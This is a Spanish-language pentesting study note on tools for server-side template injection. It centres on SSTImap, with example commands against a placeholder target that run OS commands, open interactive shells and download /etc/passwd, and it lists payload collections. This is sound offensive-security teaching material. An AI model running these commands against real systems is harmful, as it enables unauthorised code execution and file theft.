---
tags:
  - Web/Red-Team
  - Pentesting/Enumeracion
  - Pentesting/Explotacion
  - Server-Side/SSTI
Fecha de actualización: 2026-06-22
Nota previa: "[[05 - Prevención de SSTI]]"
Nota siguiente: ""
Area: "[[SSTI.base|SSTI]]"
---
---

Herramientas para automatizar la detección y explotación de SSTI. <mark style="background: #FFB8EBA6;">La identificación del motor y la explotación con filtros/sandbox siguen siendo trabajo manual</mark> (las herramientas fallan en contextos raros), pero para confirmar y explotar casos triviales aceleran mucho.

# SSTImap — el go-to actual

[`SSTImap`](https://github.com/vladko312/SSTImap) (Python 3, **activa** — v1.3, 2025; incluida en Kali) es el sucesor moderno de `tplmap`, con soporte de **30+ motores** (Jinja2, Twig, Mako, Freemarker, Velocity, Nunjucks, ERB…). Detecta la inyección, identifica el motor y reporta las **capacidades** disponibles (ejecución de comandos, lectura/escritura de ficheros, shell):

```shell-session
$ git clone https://github.com/vladko312/SSTImap && cd SSTImap
$ pip3 install -r requirements.txt

# Detectar SSTI e identificar el motor
$ python3 sstimap.py -u 'http://target/index.php?name=test'

# Ejecutar un comando del SO
$ python3 sstimap.py -u 'http://target/index.php?name=test' --os-cmd 'id'

# Shell interactiva del SO
$ python3 sstimap.py -u 'http://target/index.php?name=test' --os-shell

# Shell en el lenguaje del motor (Python/PHP…)
$ python3 sstimap.py -u 'http://target/index.php?name=test' --eval-shell

# Descargar un fichero remoto
$ python3 sstimap.py -u 'http://target/index.php?name=test' -D '/etc/passwd' './passwd'
```

Flags útiles: `-i` (modo interactivo), `--crawl <n>` (crawl del sitio), `-e <engine>` (forzar motor), soporte de formularios y de petición desde fichero. Salida típica al detectar:

```
[+] SSTImap identified the following injection point:
  Query parameter: name
  Engine: Twig
  Capabilities: Shell command execution: ok | File read: ok | Code evaluation: ok, php code
```

# tplmap — el predecesor (no usar)

[`tplmap`](https://github.com/epinna/tplmap) fue la herramienta original, pero está **abandonada y en Python 2**. SSTImap la reemplaza con el mismo enfoque y soporte moderno. Mencionada solo porque writeups antiguos la citan.

# Payloads y referencias

| Recurso | Uso |
| - | - |
| [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) | Payloads por motor (detección, LFI, RCE, bypass) |
| [Hackmanit — template-injection-table](https://github.com/Hackmanit/template-injection-table) | Tabla interactiva de firmas `{{7*7}}`/`${7*7}` por motor (base del [[01 - Identificación de SSTI|árbol de identificación]]) |
| [payload-box/ssti-advanced-payload-list](https://github.com/payload-box/ssti-advanced-payload-list) | 2000+ payloads por motor — útil como wordlist en Burp Intruder |
| Documentación del motor (Jinja, Twig, Freemarker…) | La fuente definitiva: qué funciones dan ejecución |

> [!tip]+ Detección en Burp
> `Active Scan++` y `Backslash Powered Scanner` (PortSwigger, BApp Store) marcan parámetros candidatos a SSTI durante el escaneo activo; la confirmación y explotación van a mano o con SSTImap. No hay una extensión de Burp de *explotación* SSTI tan consolidada como `SQLMap` para SQLi.

# Estado de mantenimiento (2026)

| Herramienta | Lenguaje | Estado | Uso |
| - | - | - | - |
| **SSTImap** | Python 3 | ✅ Activa | Detección + explotación SSTI (sucesor de tplmap) |
| **tplmap** | Python 2 | ❌ Abandonada | — usar SSTImap |

> [!warning]+ Manual para filtros y sandbox
> SSTImap confirma y explota lo trivial, pero ante [[04 - Evasión de filtros y sandbox en SSTI|filtros de caracteres o un sandbox]] casi siempre hay que construir el payload a mano. Úsalo para identificar motor y capacidades; afina la explotación manualmente. Mismo criterio que con [[01 - Detección de SQL Injection|SQLMap]] o [[07 - Arsenal de herramientas SSRF|SSRFmap]].

> [!info]+ Fuentes
> - [SSTImap](https://github.com/vladko312/SSTImap) · [tplmap (abandonada)](https://github.com/epinna/tplmap)
> - [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) · [Hackmanit — template-injection-table](https://github.com/Hackmanit/template-injection-table)

Con el arsenal se cierra el sub-tema **SSTI**. La MOC lo agrupa: [[SSTI.base|SSTI]]. El siguiente sub-tema server-side es [[00 - Inyección SSI (Server-Side Includes)|SSI]].
